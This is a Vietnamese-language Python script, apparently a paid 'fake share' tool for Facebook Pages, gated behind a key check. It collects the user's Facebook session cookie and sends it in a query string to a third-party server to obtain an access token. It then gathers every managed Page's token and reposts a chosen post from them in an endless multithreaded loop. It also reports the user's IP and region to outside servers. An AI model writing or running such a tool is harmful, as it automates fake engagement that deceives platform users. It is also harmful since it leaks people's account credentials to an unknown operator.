import requests, time, os, sys
from datetime import datetime
import threading

den = "\033[0;30m"
trang = "\033[0;37m"
do = "\033[0;31m"
xanh_la = "\033[0;32m"
nau = "\033[0;33m"
xanh_duong = "\033[0;34m"
tim = "\033[0;35m"
xanh_ngoc = "\033[0;36m"
xam_nhat = "\033[0;37m"
xam_dam = "\033[1;30m"
do_nhat = "\033[1;31m"
xanh_la_nhat = "\033[1;32m"
vang = "\033[1;33m"
xanh_duong_nhat = "\033[1;34m"
tim_nhat = "\033[1;35m"
hong  = "\033[95m"
xanh_ngoc_nhat = "\033[1;36m"
trang_nhat = "\033[1;37m"

try:
	apiServer = requests.get("https://ducthinhexe.github.io/")
	if "admin" in apiServer.text:
		__ADMIN__   = apiServer.json()["admin"]
		verison = apiServer.json()["verison"]
		fullName = apiServer.json()['data']['fullName']
		facebook = apiServer.json()['data']['Facebook']
		zalo     = apiServer.json()['data']['Zalo']
		boxzalo  = apiServer.json()['data']['BoxZalo']
		thuekey  = apiServer.json()['data']['thuekey']
	else:
		msg = apiServer.text.upper().replace('\n','')
		print(f"{do}Server Đang {vang}{msg} {do}!")
		exit()
except Exception as e:
	print(f"{do}Đã Có Lỗi Xảy Ra, Vui Lòng Inbox Zalo : {xanh_duong_nhat}0923.932.075{do} - LỖI : {vang}{e}")
	exit()
########################################
notification = requests.get("https://jirayshop.xyz/keytool/notification.php").text
res = requests.get('https://ipinfo.io/json').json()
ip = res['ip']
########################################
black     = "\033[30m"
red       = "\033[31m"
green     = "\033[32m"
yellow    = "\033[33m"
blue      = "\033[34m"
purple    = "\033[35m"
whiteBlue = "\033[36m"
gray      = "\033[37m" 
white     = "\033[37m"
black     = "\033[40m"
def main(cookie, token, idPost):
    url = f"https://graph.facebook.com/me/feed?link=https://m.facebook.com/{idPost}&published=0&access_token={token}"
    r = requests.post(url, cookies={'Cookie':cookie}).json()
    time=datetime.now().strftime("%H:%M:%S")
    if 'id' in r:
        id = r['id']
        print(f'\033[1;31m[ {whiteBlue}DUCTHINHEXE \033[1;31m] \033[1;31m| \033[1;36m{time} \033[1;31m| \033[1;33m{idPost} \033[1;31m| \033[1;32mSHARE SUCCESS \033[1;31m| \033[1;33m{id} \033[1;31m|')
    else:
        print(f'\033[1;31m[ {whiteBlue}DUCTHINHEXE \033[1;31m] \033[1;31m| \033[1;36m{time} \033[1;31m| {red}SHARE ERROR \033[1;31m| \033[1;33m{idPost} \033[1;31m|',end='\r')
import binascii, codecs, base64, random
class KeyTool:
	def __init__(self):
		dateTime = datetime.now().strftime("%d%m%Y")
		getIP = requests.get("https://ipinfo.io/json").json()
		self.ipGoc = getIP['ip']
		self.region = getIP['region']
		self.ip = self.ipGoc.replace('.', '')
		Realkey1 = f"Jiray-{self.region}-{dateTime}-{int(self.ip) + 262482006}"
		Realkey = Realkey1[::-1]
		self.key = base64.b64encode(Realkey.encode()).decode('utf-8')[:8]
		self.notification = '\n'.join([f"{vang}[{trang}<{xanh_la}/{trang}>{vang}] {xanh_la}{line}" for line in requests.get("https://jirayshop.xyz/keytool/notification.php").text.splitlines()])

	
	@property
	def BannerKey(self):
		self.Clear
		urlKey = requests.get(f'https://jirayshop.xyz/keytool/tao.php?ip={self.ip}&region={self.region}').json()['url']
		logo = f"""             {xanh_la_nhat}██╗██╗██████╗  █████╗ ██╗   ██╗
             {xanh_duong_nhat}██║██║██╔══██╗██╔══██╗ ██╗ ██╔╝
             {xanh_la_nhat}██║██║██████╔╝███████║ ╚████╔╝ 
        {xanh_duong_nhat}██╗  ██║██║██╔══██╗██╔══██║  ╚██╔╝  
        {xanh_la_nhat}╚█████╔╝██║██║  ██║██║  ██║   ██║   
         {xanh_duong_nhat}╚════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
{trang} Copyright {xanh_la}@DucThinhEXE - Jiray {trang}| Verirson : {xanh_la}{verison}
{trang_nhat}═════════════════════════════════════════════════════
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Facebook        {do_nhat}: {vang}{facebook}{vang}
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Youtube         {do_nhat}: {tim_nhat}https://youtube.com/@JirayIsMe{vang}
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Thuê Key        {do_nhat}: {xanh_duong_nhat}{thuekey}{vang}
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Zalo            {do_nhat}: {xanh_la_nhat}{zalo}{vang}
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Box Telegram    {do_nhat}: {do_nhat}{boxzalo}{trang_nhat}
{trang_nhat}═════════════════════════════════════════════════════
{trang_nhat}{self.notification}{trang_nhat}
{trang_nhat}════════════════════ \033[95mLINK KEY {trang_nhat}═══════════════════════
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Link Lấy Key {do_nhat}: \033[1;33m{urlKey}{trang_nhat}
═════════════════════════════════════════════════════
"""
		for _ in logo:
			sys.stdout.write(_)
			sys.stdout.flush()
			time.sleep(random.uniform(0.00125, 0.00025))
	
	@property
	def InputKey(self):
		keyTool = input(f"{xanh_ngoc_nhat}Nhập Key Ngày Hôm Nay ( Nếu Key Phí Thì Không Cần Vượt ) : {trang_nhat}")
		return keyTool
	
	def Convert2Check(self, key):
		if len(key) > 3:
			encKey = key[::-1]
			decoded_hex_bytes = binascii.unhexlify(encKey)
			decoded_rot13 = codecs.decode(decoded_hex_bytes.decode('utf-8'), 'rot_13')
			return decoded_rot13
		else:
			return False
	def Logo(self, key, date):
		self.Clear
		logo = f"""             {xanh_la_nhat}██╗██╗██████╗  █████╗ ██╗   ██╗
             {xanh_duong_nhat}██║██║██╔══██╗██╔══██╗ ██╗ ██╔╝
             {xanh_la_nhat}██║██║██████╔╝███████║ ╚████╔╝ 
        {xanh_duong_nhat}██╗  ██║██║██╔══██╗██╔══██║  ╚██╔╝  
        {xanh_la_nhat}╚█████╔╝██║██║  ██║██║  ██║   ██║   
         {xanh_duong_nhat}╚════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
{trang} Copyright {xanh_la}@DucThinhEXE - Jiray {trang}| Verirson : {xanh_la}{verison}
{trang_nhat}═════════════════════════════════════════════════════
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Facebook        {do_nhat}: {vang}{facebook}{vang}
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Youtube         {do_nhat}: {tim_nhat}https://youtube.com/@JirayIsMe{vang}
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Thuê Key        {do_nhat}: {xanh_duong_nhat}{thuekey}{vang}
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Zalo            {do_nhat}: {xanh_la_nhat}{zalo}{vang}
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Box Telegram    {do_nhat}: {do_nhat}{boxzalo}{trang_nhat}
{trang_nhat}═════════════════════════════════════════════════════
{trang_nhat}{self.notification}{trang_nhat}
{trang_nhat}════════════════════ \033[95mINFO MEMBER {trang_nhat}══════════════════════
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}IP  : {vang}{self.ipGoc}
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Key : {vang}{'*' * int(len(key) - 2)+ key[int(len(key) - 2):]}
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Expiration date : {vang}{date}{trang_nhat}
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Tool Name : {vang}Share Ảo Page Pro5{trang_nhat}
══════════════════════════════════════════════════════
"""
		for _ in logo:
			sys.stdout.write(_)
			sys.stdout.flush()
			time.sleep(random.uniform(0.00125, 0.00025))

	@property
	def Clear(self):
		os.system('cls' if os.name == "nt" else "clear")
	
	@property
	def CheckKey(self):
		try:
			file = open("JirayKeyTool.txt", 'r')
			file.close()
		except:
			file = open("JirayKeyTool.txt", "w")
			file.write(self.ipGoc)
			file.close()
		with open("JirayKeyTool.txt", "r") as fKey:
			keyOld = fKey.read().strip()
		checkVip = requests.post(f"https://jirayshop.xyz/api/check_key.php", json={'key':keyOld})
		if 'true' in checkVip.text:
			key		  	  = keyOld
			Encdate 	  = checkVip.headers['Id-Requests']
			thinhvip      = self.Convert2Check(Encdate)
			if thinhvip == False:
				return False, f"{do}Key Không Tồn Tại Hoặc Đã Hết Hạn!"
			else:
				keyRS, date = thinhvip.split('-')[0], thinhvip.split('-')[1]
				if keyRS != key:return False, f"{do}Key Không Tồn Tại Hoặc Đã Hết Hạn!"
				else:return True, keyRS, date
		else:
			if keyOld != self.key:
				return False, f"{do}Key Không Tồn Tại Hoặc Đã Hết Hạn!"
			else:
				with open("JirayKeyTool.txt", "w") as fKey:
					fKey.write(self.key)
					return True, self.key, str(datetime.now().strftime("%d/%m/%Y"))
t = KeyTool()
t.Clear
checkKey = t.CheckKey
if checkKey[0] == False:
	t.BannerKey
	while True:
		keyInput = t.InputKey
		with open("JirayKeyTool.txt", "w") as fKey:
			fKey.write(keyInput)
		check = t.CheckKey
		if check[0] == False:
			msg = check[1]
			print(msg)
			time.sleep(1.2)
		else:
			key = check[1]
			date = check[2]
			print(f'{trang_nhat}Chào Mừng Bạn Đến Với {vang}JIRAYTOOL {trang_nhat}!')
			break
else:
	key = checkKey[1]
	date = checkKey[2]

############## FUNCTION #################
def Banner():
    t.Logo(key, date)
def Clear():
    os.system("cls" if os.name == "nt" else "clear")
Banner()
while True:
    cookie = input('\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Cookie Facebook : \033[1;33m ')
    if "c_user=" not in cookie:
        print(f'{red}Cookie Sai Định Dạng, Vui Lòng Thử Lại!')
    else:
        print(f'{green}Đang Thực Hiện Lấy Page....')
        time.sleep(0.75)
        listToken = []
        getToken = requests.get('https://jirayshop.xyz/apitool/gettoken.php?cookie={}&type={}'.format(cookie, "facebook_lite")).json()
        if getToken['type'] == "success":
            token = getToken['access_token']
            time.sleep(0.25)
            getPage = requests.get(f'https://graph.facebook.com/me/accounts?access_token={token}').json()
            try:
                if 'error' in getPage:
                    print(f'{red}Đã Có Lỗi Xảy Ra, Vui Lòng Thử Lại!')
                else:
                    if len(getPage['data']) == 0:
                        print(f'{red}Cookie Không Chứa Page, Vui Lòng Thêm Page Và Thử Lại!')
                    else:
                        for i in getPage['data']:
                            tokenPage = i['access_token']
                            listToken.append(tokenPage)
                        print(f'\033[1;37mGet Thành Công {white}{str(len(listToken))} Page! Đang Vào Tool...')
                        break
            except :
                print(f'{red}Đã Có Lỗi Xảy Ra, Vui Lòng Thử Lại!')
        else:
            msg = getToken['msg']
            print(f'{red}{msg}')
#################################
Banner()
idPost = input('Nhập ID Post : ')
thread = int(input('Số luồng : '))
time.sleep(0.5)
print('═══════════════════════════════════════════════════════')
while True:
    for token in listToken:
        t = threading.Thread(target=main, args=(cookie, token, idPost))
        t.start()
        while threading.active_count() > thread:
                t.join()
